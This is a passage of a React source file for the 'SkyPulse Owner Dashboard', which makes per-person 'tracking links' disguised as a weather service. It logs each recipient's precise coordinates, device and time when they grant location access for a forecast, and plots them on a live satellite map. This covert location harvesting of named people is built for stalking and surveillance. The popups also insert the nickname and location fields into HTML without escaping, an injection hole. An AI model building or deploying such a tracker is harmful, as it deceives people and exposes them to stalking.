import React, { useEffect, useRef, useState } from 'react';
import L from 'leaflet';
import 'leaflet/dist/leaflet.css';
import { motion, AnimatePresence } from 'motion/react';
import {
  MapPin,
  Clock,
  Trash2,
  RefreshCw,
  Copy,
  Check,
  Compass,
  Users,
  ExternalLink,
  ShieldAlert,
  ArrowLeft,
  ChevronRight,
  Monitor,
  Smartphone,
  CloudSun
} from 'lucide-react';

interface VisitorLocation {
  id: string;
  ref: string;
  lat: number;
  lon: number;
  city: string;
  country: string;
  state: string;
  locality: string;
  temp: string;
  condition: string;
  timestamp: string;
  userAgent: string;
}

interface OwnerDashboardProps {
  theme?: 'light' | 'dark';
  onBackToUserView: () => void;
}

export function OwnerDashboard({ theme = 'dark', onBackToUserView }: OwnerDashboardProps) {
  const [locations, setLocations] = useState<VisitorLocation[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [selectedLocation, setSelectedLocation] = useState<VisitorLocation | null>(null);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState('');
  const [mapStyle, setMapStyle] = useState<'streets' | 'satellite' | 'hybrid'>('satellite');
  
  const [ownerCoords, setOwnerCoords] = useState<{lat: number, lon: number} | null>(null);
  
  // Extract custom coordinates passed via URL on mount
  const [urlCoords, setUrlCoords] = useState<{lat: number, lon: number} | null>(() => {
    const queryParams = new URLSearchParams(window.location.search);
    const urlLatParam = queryParams.get('lat') || queryParams.get('latitude');
    const urlLonParam = queryParams.get('lon') || queryParams.get('longitude');
    const lat = urlLatParam ? parseFloat(urlLatParam) : null;
    const lon = urlLonParam ? parseFloat(urlLonParam) : null;
    if (lat !== null && !isNaN(lat) && lon !== null && !isNaN(lon)) {
      return { lat, lon };
    }
    return null;
  });

  const hasInitialViewSetRef = useRef(false);

  // Link generator state
  const [targetName, setTargetName] = useState('');
  const [generatedLink, setGeneratedLink] = useState('');
  const [linkCopied, setLinkCopied] = useState(false);

  const mapContainerRef = useRef<HTMLDivElement>(null);
  const mapRef = useRef<L.Map | null>(null);
  const markersGroupRef = useRef<L.LayerGroup | null>(null);

  // Fetch Owner's current location on mount for the map
  useEffect(() => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          setOwnerCoords({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
          });
        },
        (err) => {
          console.warn("Could not retrieve owner's location for the map dashboard:", err);
        },
        { enableHighAccuracy: true, timeout: 8000 }
      );
    }
  }, []);

  // Fetch recorded visitor locations
  const fetchLocations = async (showSpinner = false) => {
    if (showSpinner) setLoading(true);
    setError(null);
    try {
      const res = await fetch('/api/locations');
      if (!res.ok) throw new Error('Failed to retrieve location log');
      const data = await res.json();
      setLocations(data);
    } catch (err: any) {
      setError(err?.message || 'Server API Error');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchLocations(true);
    // Auto-refresh logs every 15 seconds silently
    const interval = setInterval(() => fetchLocations(false), 15000);
    return () => clearInterval(interval);
  }, []);

  // Map Initialization (once on mount)
  useEffect(() => {
    if (!mapContainerRef.current) return;

    const map = L.map(mapContainerRef.current, {
      center: [20, 0],
      zoom: 2,
      zoomControl: true,
    });

    const markersGroup = L.layerGroup().addTo(map);
    markersGroupRef.current = markersGroup;
    mapRef.current = map;

    return () => {
      if (mapRef.current) {
        mapRef.current.remove();
        mapRef.current = null;
      }
      markersGroupRef.current = null;
      if (mapContainerRef.current) {
        (mapContainerRef.current as any)._leaflet_id = null;
      }
    };
  }, []);

  // Dynamic Tile Layer Manager
  useEffect(() => {
    if (!mapRef.current) return;

    // Remove any existing tile layers first
    mapRef.current.eachLayer((layer) => {
      if (layer instanceof L.TileLayer) {
        mapRef.current?.removeLayer(layer);
      }
    });

    let activeLayer: L.TileLayer;

    if (mapStyle === 'streets') {
      const tileUrl = theme === 'light'
        ? 'https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png'
        : 'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png';

      activeLayer = L.tileLayer(tileUrl, {
        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors &copy; <a href="https://carto.com/attributions">CARTO</a>',
        subdomains: 'abcd',
        maxZoom: 20,
      });
      activeLayer.addTo(mapRef.current);
    } else if (mapStyle === 'satellite') {
      activeLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
        attribution: 'Tiles &copy; Esri &mdash; Source: Esri, USDA, USGS, and the GIS User Community',
        maxZoom: 19,
      });
      activeLayer.addTo(mapRef.current);
    } else if (mapStyle === 'hybrid') {
      // Base Satellite
      activeLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
        attribution: 'Tiles &copy; Esri &mdash; Source: Esri, USDA, USGS, and the GIS User Community',
        maxZoom: 19,
      });
      activeLayer.addTo(mapRef.current);

      // Label Overlay
      const labelLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Reference/World_Boundaries_and_Places/MapServer/tile/{z}/{y}/{x}', {
        attribution: '',
        maxZoom: 19,
        pane: 'overlayPane'
      });
      labelLayer.addTo(mapRef.current);
    }
  }, [theme, mapStyle]);

  // Sync Markers & View on Location updates
  useEffect(() => {
    if (!mapRef.current || !markersGroupRef.current) return;

    markersGroupRef.current.clearLayers();

    if (locations.length === 0 && !ownerCoords && !urlCoords) return;

    // Filter locations based on search
    const filtered = locations.filter(
      loc =>
        loc.ref.toLowerCase().includes(searchTerm.toLowerCase()) ||
        loc.city.toLowerCase().includes(searchTerm.toLowerCase()) ||
        loc.country.toLowerCase().includes(searchTerm.toLowerCase())
    );

    // Identify the closest visitor to the URL target coords if present to merge them
    let targetVisitorId: string | null = null;
    if (urlCoords && filtered.length > 0) {
      let minDistance = Infinity;
      let closestLoc: any = null;

      filtered.forEach((loc) => {
        const dist = Math.sqrt(Math.pow(loc.lat - urlCoords.lat, 2) + Math.pow(loc.lon - urlCoords.lon, 2));
        if (dist < minDistance) {
          minDistance = dist;
          closestLoc = loc;
        }
      });

      // If the closest visitor is within 0.01 degrees (approx 1 km), treat them as the locked visitor target
      if (closestLoc && minDistance < 0.01) {
        targetVisitorId = closestLoc.id;
      }
    }

    const renderedCoords: { lat: number; lon: number }[] = [];

    // Helper to check if a location is already rendered or too close to owner's location
    const isAlreadyCovered = (lat: number, lon: number) => {
      // 1. Check if ownerCoords covers this exact location (threshold ~50 meters)
      if (ownerCoords && Math.abs(lat - ownerCoords.lat) < 0.0005 && Math.abs(lon - ownerCoords.lon) < 0.0005) {
        return true;
      }
      // 2. Check if another marker has already been rendered in this exact spot (threshold ~30 meters)
      return renderedCoords.some(c => Math.abs(lat - c.lat) < 0.0003 && Math.abs(lon - c.lon) < 0.0003);
    };

    // Render visitor markers
    filtered.forEach((loc) => {
      // Avoid double rendering if it is already covered by the owner's blue marker or a newer log at the same spot
      if (isAlreadyCovered(loc.lat, loc.lon)) {
        return;
      }

      // Determine if this visitor is the locked URL target coordinate
      const isUrlTarget = urlCoords && (
        loc.id === targetVisitorId ||
        (Math.abs(loc.lat - urlCoords.lat) < 0.001 && Math.abs(loc.lon - urlCoords.lon) < 0.001)
      );

      // Save to prevent rendering another marker here
      renderedCoords.push({ lat: loc.lat, lon: loc.lon });

      const customIcon = L.divIcon({
        className: isUrlTarget ? 'custom-map-marker-owner-url-target' : 'custom-map-marker-owner',
        html: isUrlTarget ? `
          <div class="relative flex items-center justify-center w-10 h-10">
            <div class="absolute w-10 h-10 rounded-full bg-emerald-500/40 animate-ping"></div>
            <div class="absolute w-7 h-7 rounded-full bg-emerald-500/20"></div>
            <div class="relative w-5 h-5 bg-emerald-500 border-2 border-white rounded-full shadow-lg shadow-emerald-500/60 flex items-center justify-center">
              <div class="w-1.5 h-1.5 bg-white rounded-full animate-pulse"></div>
            </div>
          </div>
        ` : `
          <div class="relative flex items-center justify-center w-8 h-8">
            <div class="absolute w-8 h-8 rounded-full bg-rose-500/30 animate-ping"></div>
            <div class="relative w-4.5 h-4.5 bg-rose-500 border-2 border-white rounded-full shadow-lg shadow-rose-500/50 flex items-center justify-center">
              <div class="w-1.5 h-1.5 bg-white rounded-full"></div>
            </div>
          </div>
        `,
        iconSize: isUrlTarget ? [40, 40] : [32, 32],
        iconAnchor: isUrlTarget ? [20, 20] : [16, 16],
      });

      const popupHtml = `
        <div class="p-1 font-sans text-slate-100 font-medium">
          <div class="font-extrabold text-sm ${isUrlTarget ? 'text-emerald-400' : 'text-white'}">
            ${loc.ref} ${isUrlTarget ? ' (URL Target Locked)' : ''}
          </div>
          <div class="text-xs text-slate-300 font-semibold mt-0.5">${loc.locality ? loc.locality + ', ' : ''}${loc.city}</div>
          <div class="text-xs text-slate-400 font-medium">${loc.country}</div>
          <div class="text-[11px] text-sky-400 font-bold mt-1 bg-sky-500/10 px-2 py-0.5 rounded border border-sky-400/10 w-fit">
            Weather: ${loc.temp} • ${loc.condition}
          </div>
          <div class="text-[9px] text-slate-500 font-mono mt-1.5">${new Date(loc.timestamp).toLocaleString()}</div>
        </div>
      `;

      const marker = L.marker([loc.lat, loc.lon], { icon: customIcon })
        .bindPopup(popupHtml, {
          closeButton: false,
          className: 'custom-leaflet-popup',
        });
      
      markersGroupRef.current?.addLayer(marker);
    });

    // Render standalone generic URL target marker ONLY if there is no matching visitor already drawn
    if (urlCoords) {
      const alreadyHasTarget = targetVisitorId !== null || renderedCoords.some(c => Math.abs(c.lat - urlCoords.lat) < 0.001 && Math.abs(c.lon - urlCoords.lon) < 0.001);
      if (!alreadyHasTarget) {
        const targetIcon = L.divIcon({
          className: 'custom-map-marker-url-target',
          html: `
            <div class="relative flex items-center justify-center w-10 h-10">
              <div class="absolute w-10 h-10 rounded-full bg-emerald-500/35 animate-ping"></div>
              <div class="absolute w-7 h-7 rounded-full bg-emerald-500/25"></div>
              <div class="relative w-5 h-5 bg-emerald-500 border-2 border-white rounded-full shadow-lg shadow-emerald-500/50 flex items-center justify-center">
                <div class="w-1.5 h-1.5 bg-white rounded-full"></div>
              </div>
            </div>
          `,
          iconSize: [40, 40],
          iconAnchor: [20, 20],
        });

        const targetPopupHtml = `
          <div class="p-1 font-sans text-slate-100 font-medium">
            <div class="font-extrabold text-sm text-emerald-400">URL Location Target</div>
            <div class="text-xs text-slate-300 font-semibold mt-0.5">Coordinates from URL parameters</div>
            <div class="text-[10px] text-slate-400 font-mono mt-1">lat: ${urlCoords.lat.toFixed(4)}, lon: ${urlCoords.lon.toFixed(4)}</div>
            <div class="text-[9px] text-slate-500 mt-1">Map is locked to this target coordinate</div>
          </div>
        `;

        const targetMarker = L.marker([urlCoords.lat, urlCoords.lon], { icon: targetIcon })
          .bindPopup(targetPopupHtml, {
            closeButton: false,
            className: 'custom-leaflet-popup',
          });

        markersGroupRef.current?.addLayer(targetMarker);
      }
    }

    // Render owner's own marker
    if (ownerCoords) {
      const ownerIcon = L.divIcon({
        className: 'custom-map-marker-owner-self',
        html: `
          <div class="relative flex items-center justify-center w-8 h-8">
            <div class="absolute w-8 h-8 rounded-full bg-blue-500/30 animate-pulse"></div>
            <div class="relative w-4.5 h-4.5 bg-blue-500 border-2 border-white rounded-full shadow-lg shadow-blue-500/50 flex items-center justify-center">
              <div class="w-1.5 h-1.5 bg-white rounded-full"></div>
            </div>
          </div>
        `,
        iconSize: [32, 32],
        iconAnchor: [16, 16],
      });

      const ownerPopupHtml = `
        <div class="p-1 font-sans text-slate-100">
          <div class="font-extrabold text-sm text-sky-400">Your Location (Owner)</div>
          <div class="text-xs text-slate-300 font-semibold mt-0.5">Admin Viewing Portal</div>
          <div class="text-[10px] text-slate-400 font-mono mt-1">lat: ${ownerCoords.lat.toFixed(4)}, lon: ${ownerCoords.lon.toFixed(4)}</div>
        </div>
      `;

      const ownerMarker = L.marker([ownerCoords.lat, ownerCoords.lon], { icon: ownerIcon })
        .bindPopup(ownerPopupHtml, {
          closeButton: false,
          className: 'custom-leaflet-popup',
        });

      markersGroupRef.current?.addLayer(ownerMarker);
    }

    // Centering logic (only runs on initial map state or when explicitly requested/reset)
    if (!hasInitialViewSetRef.current) {
      if (urlCoords) {
        mapRef.current.setView([urlCoords.lat, urlCoords.lon], 12);
        hasInitialViewSetRef.current = true;
      } else if (selectedLocation) {
        mapRef.current.setView([selectedLocation.lat, selectedLocation.lon], 11);
        hasInitialViewSetRef.current = true;
      } else if (filtered.length > 0) {
        const latest = filtered[0];
        mapRef.current.setView([latest.lat, latest.lon], 5);
        hasInitialViewSetRef.current = true;
      } else if (ownerCoords) {
        mapRef.current.setView([ownerCoords.lat, ownerCoords.lon], 6);
        hasInitialViewSetRef.current = true;
      }
    }
  }, [locations, selectedLocation, searchTerm, ownerCoords, urlCoords]);

  // Action: Clear single location
  const handleDeleteLocation = async (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    if (!confirm('Are you sure you want to delete this log entry?')) return;
    try {
      const res = await fetch(`/api/locations/${id}`, { method: 'DELETE' });
      if (!res.ok) throw new Error('Failed to delete log entry');
      setLocations(prev => prev.filter(l => l.id !== id));
      if (selectedLocation?.id === id) {
        setSelectedLocation(null);
      }
    } catch (err: any) {
      alert(err.message || 'Error deleting log entry');
    }
  };

  // Action: Clear all logs
  const handleClearAll = async () => {
    if (!confirm('CRITICAL: Are you sure you want to clear ALL visitor logs? This action is permanent.')) return;
    try {
      const res = await fetch('/api/locations', { method: 'DELETE' });
      if (!res.ok) throw new Error('Failed to clear logs');
      setLocations([]);
      setSelectedLocation(null);
    } catch (err: any) {
      alert(err.message || 'Error clearing logs');
    }
  };

  // Action: Generate link
  const handleGenerateLink = (e: React.FormEvent) => {
    e.preventDefault();
    if (!targetName.trim()) return;
    
    const baseUrl = window.location.origin;
    const trackingLink = `${baseUrl}/?ref=${encodeURIComponent(targetName.trim())}`;
    setGeneratedLink(trackingLink);
    setLinkCopied(false);
  };

  const handleCopyLink = () => {
    if (!generatedLink) return;
    navigator.clipboard.writeText(generatedLink);
    setLinkCopied(true);
    setTimeout(() => setLinkCopied(false), 2000);
  };

  // Action: Focus on item
  const handleSelectLocation = (loc: VisitorLocation) => {
    setSelectedLocation(loc);
    if (mapRef.current) {
      mapRef.current.setView([loc.lat, loc.lon], 12);
    }
  };

  // Helper: Device detector
  const getDeviceIcon = (userAgent: string) => {
    const ua = userAgent.toLowerCase();
    if (ua.includes('mobi') || ua.includes('android') || ua.includes('iphone')) {
      return <Smartphone className="w-4 h-4 text-emerald-400" title="Mobile Device" />;
    }
    return <Monitor className="w-4 h-4 text-indigo-400" title="Desktop Device" />;
  };

  // Helper: Time ago
  const formatTimeAgo = (isoString: string) => {
    const diffMs = Date.now() - new Date(isoString).getTime();
    const diffMins = Math.floor(diffMs / 60000);
    const diffHours = Math.floor(diffMins / 60);
    const diffDays = Math.floor(diffHours / 24);

    if (diffMins < 1) return 'Just now';
    if (diffMins < 60) return `${diffMins}m ago`;
    if (diffHours < 24) return `${diffHours}h ago`;
    return `${diffDays}d ago`;
  };

  // Filter local lists
  const filteredLocations = locations.filter(
    loc =>
      loc.ref.toLowerCase().includes(searchTerm.toLowerCase()) ||
      loc.city.toLowerCase().includes(searchTerm.toLowerCase()) ||
      loc.country.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className={`min-h-screen flex flex-col font-sans transition-colors duration-500 overflow-x-hidden ${
      theme === 'light' ? 'bg-slate-50 text-slate-900' : 'bg-slate-950 text-slate-100'
    }`}>
      
      {/* Top Admin Navbar */}
      <nav className={`sticky top-0 z-50 w-full backdrop-blur-md px-4 py-4 md:px-6 border-b flex items-center justify-between ${
        theme === 'light' ? 'bg-white/85 border-slate-200' : 'bg-slate-950/80 border-white/5'
      }`}>
        <div className="flex items-center gap-3">
          <button 
            onClick={onBackToUserView}
            className={`p-2 rounded-xl transition-all border cursor-pointer flex items-center justify-center ${
              theme === 'light'
                ? 'bg-white border-slate-200 text-slate-700 hover:bg-slate-50'
                : 'bg-white/5 border-white/5 text-slate-300 hover:bg-white/10'
            }`}
          >
            <ArrowLeft className="w-4 h-4" />
          </button>
          <div>
            <div className="flex items-center gap-2">
              <span className="flex h-2 w-2 relative">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-rose-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2 w-2 bg-rose-500"></span>
              </span>
              <h1 className={`text-base md:text-lg font-bold tracking-tight ${theme === 'light' ? 'text-slate-950' : 'text-white'}`}>
                SkyPulse Owner Dashboard
              </h1>
            </div>
            <p className="text-[10px] text-slate-400 font-mono">Visitor Geolocation Log Portal</p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={() => fetchLocations(true)}
            disabled={loading}
            className={`px-3 py-1.5 rounded-xl text-xs font-bold transition-all border cursor-pointer flex items-center gap-1.5 ${
              theme === 'light'
                ? 'bg-slate-100 border-slate-200 hover:bg-slate-200 text-slate-700'
                : 'bg-white/5 border-white/5 hover:bg-white/10 text-slate-300'
            }`}
          >
            <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} />
            <span>Refresh</span>
          </button>

          <button
            onClick={handleClearAll}
            disabled={locations.length === 0}
            className="px-3 py-1.5 rounded-xl text-xs font-bold bg-rose-500 text-white hover:bg-rose-600 shadow-md shadow-rose-500/15 cursor-pointer flex items-center gap-1.5 transition-all"
          >
            <Trash2 className="w-3.5 h-3.5" />
            <span>Clear Logs</span>
          </button>
        </div>
      </nav>

      {/* Main Grid Content */}
      <main className="flex-1 max-w-7xl w-full mx-auto p-4 md:p-6 grid grid-cols-1 lg:grid-cols-12 gap-6 relative z-10">
        
        {/* Left Side: Stats, Link Generator, Visitor logs (7 Cols) */}
        <div className="lg:col-span-7 flex flex-col gap-6">
          
          {/* 1. Header Overview Cards */}
          <div className="grid grid-cols-3 gap-4">
            <div className={`p-4 rounded-3xl border flex flex-col justify-between h-24 ${
              theme === 'light' ? 'sleek-card-light' : 'sleek-card-dark'
            }`}>
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-extrabold uppercase tracking-wider text-slate-400">Total Visits</span>
                <Users className="w-4 h-4 text-rose-500" />
              </div>
              <span className={`text-2xl font-extrabold tracking-tight font-display ${theme === 'light' ? 'text-slate-950' : 'text-white'}`}>
                {locations.length}
              </span>
            </div>

            <div className={`p-4 rounded-3xl border flex flex-col justify-between h-24 ${
              theme === 'light' ? 'sleek-card-light' : 'sleek-card-dark'
            }`}>
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-extrabold uppercase tracking-wider text-slate-400">Active Links</span>
                <Compass className="w-4 h-4 text-sky-500" />
              </div>
              <span className={`text-2xl font-extrabold tracking-tight font-display ${theme === 'light' ? 'text-slate-950' : 'text-white'}`}>
                {new Set(locations.map(l => l.ref)).size}
              </span>
            </div>

            <div className={`p-4 rounded-3xl border flex flex-col justify-between h-24 ${
              theme === 'light' ? 'sleek-card-light' : 'sleek-card-dark'
            }`}>
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-extrabold uppercase tracking-wider text-slate-400">Latest</span>
                <Clock className="w-4 h-4 text-emerald-500" />
              </div>
              <span className={`text-[11px] font-bold tracking-tight font-sans truncate ${theme === 'light' ? 'text-slate-900' : 'text-white'}`}>
                {locations[0] ? locations[0].ref : '--'}
              </span>
            </div>
          </div>

          {/* 2. Link Generator Panel */}
          <div className={`p-5 rounded-3xl border ${
            theme === 'light' ? 'sleek-card-light' : 'sleek-card-dark'
          }`}>
            <h2 className={`text-sm font-extrabold uppercase tracking-wider mb-3 flex items-center gap-2 ${
              theme === 'light' ? 'text-slate-800' : 'text-slate-200'
            }`}>
              <Compass className="w-4 h-4 text-sky-500" />
              <span>Generate Shareable Tracking Link</span>
            </h2>
            <p className="text-xs text-slate-400 mb-4 leading-relaxed">
              Generate a unique SkyPulse link for John, Mary, or anyone. When they click the link and allow location access to get their weather forecast, their precise coordinate log will instantly populate in this Owner Dashboard.
            </p>

            <form onSubmit={handleGenerateLink} className="flex gap-2.5">
              <input
                type="text"
                required
                placeholder="Enter recipient's nickname (e.g. John Doe)"
                value={targetName}
                onChange={(e) => setTargetName(e.target.value)}
                className={`flex-1 px-4 py-2 text-sm focus:outline-none transition-all ${
                  theme === 'light' ? 'sleek-input-light text-slate-950' : 'sleek-input-dark text-slate-100'
                }`}
              />
              <button
                type="submit"
                className="px-4 py-2 bg-sky-500 hover:bg-sky-600 text-white font-extrabold text-sm rounded-xl cursor-pointer shadow-lg shadow-sky-500/20 transition-all flex items-center gap-1.5 shrink-0"
              >
                Create Link
              </button>
            </form>

            <AnimatePresence>
              {generatedLink && (
                <motion.div
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: 10 }}
                  className={`mt-4 p-3 rounded-2xl border flex items-center justify-between gap-3 ${
                    theme === 'light' ? 'bg-slate-100/50 border-slate-200' : 'bg-slate-950/40 border-white/5'
                  }`}
                >
                  <div className="flex-1 overflow-hidden">
                    <span className="text-[9px] uppercase tracking-wider font-extrabold text-sky-500 block">Copy this link to send to recipient:</span>
                    <span className="text-xs font-mono text-slate-400 block truncate select-all">{generatedLink}</span>
                  </div>
                  <button
                    onClick={handleCopyLink}
                    className={`p-2 rounded-xl border flex items-center justify-center transition-all cursor-pointer ${
                      linkCopied
                        ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400'
                        : theme === 'light'
                          ? 'bg-white hover:bg-slate-50 border-slate-200 text-slate-600'
                          : 'bg-white/5 hover:bg-white/10 border-white/5 text-slate-300'
                    }`}
                  >
                    {linkCopied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                  </button>
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          {/* 3. Detailed Logs */}
          <div className={`p-5 rounded-3xl border flex-1 flex flex-col min-h-[350px] ${
            theme === 'light' ? 'sleek-card-light' : 'sleek-card-dark'
          }`}>
            <div className="flex items-center justify-between mb-4 shrink-0 gap-4 flex-wrap">
              <h2 className={`text-sm font-extrabold uppercase tracking-wider flex items-center gap-2 ${
                theme === 'light' ? 'text-slate-800' : 'text-slate-200'
              }`}>
                <MapPin className="w-4 h-4 text-rose-500" />
                <span>Recorded Geolocation Log ({filteredLocations.length})</span>
              </h2>

              <input
                type="text"
                placeholder="Search by nickname/city..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className={`px-3 py-1 text-xs focus:outline-none transition-all w-44 ${
                  theme === 'light' ? 'sleek-input-light text-slate-950' : 'sleek-input-dark text-slate-100'
                }`}
              />
            </div>

            {/* Logs List Area */}
            <div className="flex-1 overflow-y-auto max-h-[400px] pr-1.5 scrollbar-thin">
              {loading && locations.length === 0 ? (
                <div className="flex items-center justify-center h-48 flex-col gap-3">
                  <RefreshCw className="w-8 h-8 text-sky-500 animate-spin" />
                  <span className="text-xs text-slate-400 font-mono">Syncing database entries...</span>
                </div>
              ) : filteredLocations.length === 0 ? (
                <div className="flex flex-col items-center justify-center h-48 border border-dashed rounded-3xl border-slate-500/20 text-center px-4">
                  <ShieldAlert className="w-8 h-8 text-slate-500 mb-2" />
                  <h4 className="text-xs font-bold text-slate-300">No logs found</h4>
                  <p className="text-[11px] text-slate-500 max-w-xs mt-1">
                    {searchTerm ? 'No entries match your search filter.' : 'Generate a tracking link above and send it to get instant coordinate logs.'}
                  </p>
                </div>
              ) : (
                <div className="flex flex-col gap-3">
                  {filteredLocations.map((loc) => {
                    const isSelected = selectedLocation?.id === loc.id;
                    return (
                      <div
                        key={loc.id}
                        onClick={() => handleSelectLocation(loc)}
                        className={`p-3.5 rounded-2xl border transition-all duration-300 cursor-pointer text-left flex items-start justify-between gap-4 ${
                          isSelected
                            ? 'bg-rose-500/10 border-rose-500/35 shadow-lg shadow-rose-500/5'
                            : theme === 'light'
                              ? 'bg-white hover:bg-slate-50 border-slate-100'
                              : 'bg-white/5 border-white/5 hover:bg-white/10'
                        }`}
                      >
                        <div className="flex items-start gap-3 min-w-0">
                          {/* Left icon wrapper */}
                          <div className={`p-2.5 rounded-xl mt-0.5 shrink-0 ${
                            isSelected 
                              ? 'bg-rose-500/15 text-rose-500' 
                              : theme === 'light' ? 'bg-slate-100 text-slate-600' : 'bg-white/5 text-slate-400'
                          }`}>
                            <MapPin className="w-4 h-4" />
                          </div>

                          <div className="min-w-0">
                            {/* Nickname and time */}
                            <div className="flex items-center gap-2 flex-wrap">
                              <span className={`text-xs font-extrabold ${theme === 'light' ? 'text-slate-900' : 'text-white'}`}>
                                {loc.ref}
                              </span>
                              <span className="text-[9px] font-mono text-slate-500 bg-slate-500/10 px-1.5 py-0.2 rounded">
                                {formatTimeAgo(loc.timestamp)}
                              </span>
                            </div>

                            {/* City and Region */}
                            <p className="text-xs font-medium text-slate-400 mt-0.5 truncate">
                              {loc.locality ? loc.locality + ', ' : ''}{loc.city}, {loc.country}
                            </p>

                            {/* Coordinates and Weather */}
                            <div className="flex items-center gap-3 mt-2 flex-wrap text-[10px] font-mono text-slate-500">
                              <span className="bg-slate-500/10 px-1.5 py-0.5 rounded">
                                {loc.lat.toFixed(4)}, {loc.lon.toFixed(4)}
                              </span>
                              
                              <span className="flex items-center gap-1 text-sky-400 bg-sky-500/5 px-1.5 py-0.5 rounded border border-sky-500/5">
                                <CloudSun className="w-3 h-3 text-sky-500 shrink-0" />
                                <span>{loc.temp} • {loc.condition}</span>
                              </span>

                              <span className="flex items-center gap-1 bg-slate-500/10 px-1.5 py-0.5 rounded">
                                {getDeviceIcon(loc.userAgent)}
                                <span className="truncate max-w-[120px]">{loc.userAgent.split(' ')[0]}</span>
                              </span>
                            </div>
                          </div>
                        </div>

                        {/* Right side Actions */}
                        <div className="flex items-center gap-1.5 shrink-0 self-center">
                          <button
                            onClick={(e) => handleDeleteLocation(loc.id, e)}
                            className={`p-2 rounded-xl transition-all border cursor-pointer hover:bg-rose-500 hover:text-white ${
                              theme === 'light'
                                ? 'bg-white border-slate-200 text-slate-600'
                                : 'bg-white/5 border-white/5 text-slate-400'
                            }`}
                            title="Delete log entry"
                          >
                            <Trash2 className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </div>

        </div>

        {/* Right Side: Map Display (5 Cols) */}
        <div className="lg:col-span-5 flex flex-col gap-6 lg:sticky lg:top-24 h-fit">
          
          <div className={`p-5 rounded-3xl border shadow-xl flex flex-col h-[520px] overflow-hidden ${
            theme === 'light' ? 'sleek-card-light' : 'sleek-card-dark'
          }`}>
            <div className="flex items-center justify-between mb-3 shrink-0 flex-wrap gap-2 animate-fade-in">
              <div className="flex items-center gap-2">
                <Compass className="w-4 h-4 text-rose-500" />
                <h3 className={`text-sm font-extrabold uppercase tracking-wider ${
                  theme === 'light' ? 'text-slate-800' : 'text-slate-200'
                }`}>
                  Interactive Target Map
                </h3>
              </div>

              {/* Map Style Selector */}
              <div className={`flex items-center gap-0.5 p-0.5 rounded-xl border text-[10px] font-bold ${
                theme === 'light' ? 'bg-slate-100 border-slate-200/80' : 'bg-slate-900 border-white/5'
              }`}>
                <button
                  type="button"
                  onClick={() => setMapStyle('streets')}
                  className={`px-2 py-1 rounded-lg transition-all cursor-pointer ${
                    mapStyle === 'streets'
                      ? 'bg-rose-500 text-white shadow-sm shadow-rose-500/10'
                      : theme === 'light' ? 'text-slate-600 hover:bg-slate-200' : 'text-slate-400 hover:bg-white/5'
                  }`}
                >
                  Streets
                </button>
                <button
                  type="button"
                  onClick={() => setMapStyle('satellite')}
                  className={`px-2 py-1 rounded-lg transition-all cursor-pointer ${
                    mapStyle === 'satellite'
                      ? 'bg-rose-500 text-white shadow-sm shadow-rose-500/10'
                      : theme === 'light' ? 'text-slate-600 hover:bg-slate-200' : 'text-slate-400 hover:bg-white/5'
                  }`}
                >
                  Satellite
                </button>
                <button
                  type="button"
                  onClick={() => setMapStyle('hybrid')}
                  className={`px-2 py-1 rounded-lg transition-all cursor-pointer ${
                    mapStyle === 'hybrid'
                      ? 'bg-rose-500 text-white shadow-sm shadow-rose-500/10'
                      : theme === 'light' ? 'text-slate-600 hover:bg-slate-200' : 'text-slate-400 hover:bg-white/5'
                  }`}
                >
                  Hybrid
                </button>
              </div>

              <div className="flex items-center gap-3">
                {urlCoords && (
                  <button
                    type="button"
                    onClick={() => {
                      if (mapRef.current) {
                        mapRef.current.setView([urlCoords.lat, urlCoords.lon], 12);
                      }
                    }}
                    className="text-[10px] font-bold text-emerald-400 hover:underline cursor-pointer transition-all flex items-center gap-1 bg-emerald-500/10 px-1.5 py-0.5 rounded border border-emerald-500/20"
                    title="Recenter map on the locked coordinates from the URL"
                  >
                    <span className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></span>
                    Center URL Target
                  </button>
                )}
                {ownerCoords && (
                  <button
                    type="button"
                    onClick={() => {
                      if (mapRef.current) {
                        mapRef.current.setView([ownerCoords.lat, ownerCoords.lon], 11);
                      }
                    }}
                    className="text-[10px] font-bold text-sky-500 hover:underline cursor-pointer transition-all"
                  >
                    Center on Me
                  </button>
                )}
                {selectedLocation && (
                  <button
                    onClick={() => {
                      setSelectedLocation(null);
                      hasInitialViewSetRef.current = false;
                    }}
                    className="text-[10px] font-bold text-sky-500 hover:underline cursor-pointer transition-all"
                  >
                    Reset Zoom
                  </button>
                )}
              </div>
            </div>

            {/* Actual Leaflet Container Node */}
            <div className="flex-1 rounded-2xl overflow-hidden border border-white/5 relative z-0">
              <div ref={mapContainerRef} className="w-full h-full" />
              
              {/* Floating map info details */}
              {selectedLocation && (
